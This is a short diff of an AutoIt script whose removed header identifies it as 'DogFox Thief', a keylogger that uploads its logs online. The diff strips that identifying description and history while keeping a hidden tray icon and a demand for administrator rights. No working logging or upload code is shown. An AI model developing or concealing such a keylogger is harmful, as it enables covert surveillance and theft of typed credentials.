@@ -1,39 +1,9 @@
 #NoTrayIcon
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
-#AutoIt3Wrapper_Res_Fileversion=0.0.0.17
-#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
+#AutoIt3Wrapper_Compile_Both=y
 #AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
-#Region Index
-; #INDEX# =======================================================================================================================
-; Title .........: DogFox Thief
-; Filename.......: Thief.au3
-; AutoIt Version : 3.3.8.1++
-; Language ......: English
-; Description ...: Keyloger
-; Author(s) .....: DogFox
-; Dll ...........: user32.dll
-; Requirements ..: Internet to upload logs files (opt)
-; Version .......: v1.0
-; Last Update ...: 02/14/2013
-; Note ..........:
-; ===============================================================================================================================
-#EndRegion Index
-#Region History
-#cs
-	Update History:
-	===================================================
-	v1.0 02/14/2013
-	- Very simple
-	Fixes
-	- None
-	Enhancements
-	- None
-	New Features
-	- None
-	===================================================
-#ce
-#EndRegion History
+
 #Region Config
 #include <Misc.au3>
 #include <File.au3>
